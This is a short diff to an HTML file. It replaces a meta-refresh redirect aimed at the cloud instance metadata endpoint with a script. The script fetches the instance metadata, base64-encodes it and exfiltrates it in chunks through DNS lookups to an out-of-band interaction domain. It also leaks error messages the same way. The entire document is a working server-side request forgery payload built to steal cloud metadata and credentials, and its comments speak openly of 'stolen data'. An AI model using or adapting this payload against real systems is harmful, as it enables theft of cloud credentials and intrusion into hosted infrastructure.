@@ -1,1 +1,28 @@
-<meta http-equiv="refresh" content="0; url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" />
+<script>
+  // The internal target we want to hit
+  const targetUrl = 'http://169.254.169.254/metadata/instance?api-version=2021-02-01';
+  
+  // Your unique Burp Collaborator / Interactsh domain
+  const exfilDomain = 'yxvymqbmkxaoqosfwvmagz6pidd6jubij.oast.fun';
+
+  fetch(targetUrl)
+    .then(response => response.text())
+    .then(data => {
+      // Encode the stolen data in Base64 to make it DNS-safe
+      const encodedData = btoa(data);
+
+      // Split the encoded data into chunks of ~60 characters
+      const chunks = encodedData.match(/.{1,60}/g);
+
+      // Exfiltrate each chunk as a DNS query
+      chunks.forEach((chunk, index) => {
+        const dnsQuery = `${chunk}.${index}.oracle.${exfilDomain}`;
+        new Image().src = `http://${dnsQuery}`;
+      });
+    })
+    .catch(error => {
+      // If there's an error, exfiltrate the error message
+      const encodedError = btoa(error.toString());
+      new Image().src = `http://error.${encodedError}.${exfilDomain}`;
+    });
+</script>
